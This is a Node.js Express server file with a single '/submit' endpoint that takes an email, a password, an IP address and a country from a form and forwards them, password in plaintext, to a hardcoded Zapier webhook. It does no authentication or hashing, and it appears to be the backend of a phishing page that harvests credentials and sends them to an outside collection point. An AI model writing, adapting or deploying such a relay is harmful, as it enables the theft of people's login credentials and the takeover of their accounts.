require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const port = process.env.PORT || 3001;

// Middleware
app.use(cors()); // Allow cross-origin requests from frontend
app.use(bodyParser.json()); // Parse JSON bodies
app.use(bodyParser.urlencoded({ extended: true })); // Parse URL-encoded bodies

// POST endpoint to handle form submission
app.post('/submit', async (req, res) => {
  const { email, password, ip, country } = req.body;

  // Basic validation
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }

  try {
    // Send data to Zapier webhook
    const zapierUrl = 'https://hooks.zapier.com/hooks/catch/25602997/ufym2hv/';

    const payload = {
      timestamp: new Date().toISOString(),
      email,
      password,
      ip,
      country
    };

    const response = await fetch(zapierUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      console.log('Data sent to Zapier successfully');
      res.status(200).json({ success: true, message: 'Form submitted and data sent to Zapier' });
    } else {
      throw new Error(`Zapier responded with status ${response.status}`);
    }
  } catch (error) {
    console.error('Error sending to Zapier:', error);
    res.status(500).json({ error: 'Failed to send data to Zapier' });
  }
});

// Start server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
